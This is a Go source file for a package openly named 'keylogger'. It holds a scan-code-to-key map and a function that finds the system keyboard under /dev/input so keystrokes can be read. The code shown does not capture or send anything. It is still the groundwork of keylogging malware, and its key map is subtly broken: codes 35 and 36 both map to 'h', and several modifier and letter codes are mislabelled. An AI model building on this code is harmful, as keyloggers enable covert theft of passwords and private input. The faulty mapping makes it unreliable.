package keylogger

import (
	"fmt"
	"os"
	"strings"
)

// Wrapper
type KeyLogger struct {
   fd *os.File
}

// Keyboard map
var keyMap = map[uint16]string{
    1: "ESC",
    2: "1",
    3: "2",
    4: "3",
    5: "4",
    6: "5",
    7: "6",
    8: "7",
    9: "8",
    10: "9",
    11: "0",
    12: "-",
    13: "=",
    14: "BACKSPACE",
    15: "TAB",
    16: "q",
    17: "w",
    18: "e",
    19: "r",
    20: "t",
    21: "y",
    22: "u",
    23: "i",
    24: "o",
    25: "p",
    26: "[",
    27: "]",
    28: "ENTER",
    29: "CAPS_LOCK",
    30: "a",
    31: "s",
    32: "d",
    33: "f",
    34: "g",
    35: "h",
    36: "h",
    37: "j",
    38: "k",
    39: "l",
    40: ";",
    41: "'",
    42: "R_SHIFT",
    43: "z",
    44: "x",
    45: "c",
    46: "v",
    47: "b",
    48: "n",
    49: "m",
    50: ",",
    51: ".",
    52: "/",
    53: "L_SHIFT",
    54: "R_CTRL",
    55: "R_ALT",
    56: "SPACE",
    57: "L_CTRL",
}

type device []string

// Looks if there are any devices in the system
func (d *device) hasDevice(s string) bool{
    for _, device := range *d {
        if strings.Contains(s, device) {
            return true
        }
    }
    return false
}

var restrictedD = device{"mouse"}
var allowedD = device{"keyboard"}

//  
func FindKeyBoard() string {
    path := "/sys/class/input/event%d/device/name"
    res := "/dev/input/event%d"


    for i := 0; i < 255; i++ {
        buff, err := os.ReadFile(fmt.Sprintf(path, i))

        if err != nil {
            continue
        }

        deviName := strings.ToLower(string(buff))

        if restrictedD.hasDevice(deviName) {
            continue
        } else if allowedD.hasDevice(deviName) {
            return fmt.Sprintf(res, i)
        }

    }

    return ""
}

